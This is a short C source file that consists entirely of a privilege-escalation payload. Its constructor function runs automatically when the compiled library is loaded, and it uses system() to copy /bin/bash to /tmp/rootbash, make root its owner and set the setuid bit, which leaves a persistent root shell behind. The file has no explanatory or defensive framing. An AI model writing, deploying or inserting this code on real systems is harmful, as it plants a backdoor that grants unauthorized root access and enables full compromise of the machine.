#include <stdlib.h>

__attribute__((constructor))
void init(void) {
    system("cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4755 /tmp/rootbash");
}
